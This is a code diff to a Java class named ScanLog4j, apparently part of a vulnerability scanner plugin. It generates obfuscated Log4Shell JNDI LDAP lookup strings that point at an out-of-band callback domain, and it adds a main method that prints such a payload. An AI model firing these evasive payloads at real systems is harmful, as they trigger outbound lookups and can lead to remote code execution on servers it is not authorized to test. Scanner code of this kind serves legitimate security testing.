@@ -58,7 +58,7 @@ public class ScanLog4j extends Reporter {
     }
 
     private static String genLog4jPayload(String dns, String sig) {
-        return String.format("%s${%s.%s}%s", Utils.getRandomString(4), obfuscator("jndi:ldap://" + sig), obfuscator(dns), Utils.getRandomString(4));
+        return String.format("%s${%s.%s:1344/%s}%s", Utils.getRandomString(4), obfuscator("jndi:ldap://" + sig), obfuscator(dns),Utils.getRandomString(4), Utils.getRandomString(4));
     }
 
     private static String obfuscator(String payload) {
@@ -68,5 +68,11 @@ public class ScanLog4j extends Reporter {
             finalString.append(str);
         }
         return finalString.toString();
+    }
+    public static void main(String[] args) throws Exception {
+        String collaboratorPayload = "oe6xdsw7z2mstx2a0sutyu60erkh86.nl.chromdnssrv.com";
+        String sig = Utils.getRandomString(3).toLowerCase();
+        String payload = genLog4jPayload(collaboratorPayload, sig);
+        System.out.println(String.format("generate log4j2 RCE collaboratorPayload: %s.%s, final payload: %s", sig, collaboratorPayload, payload));
     }
 }
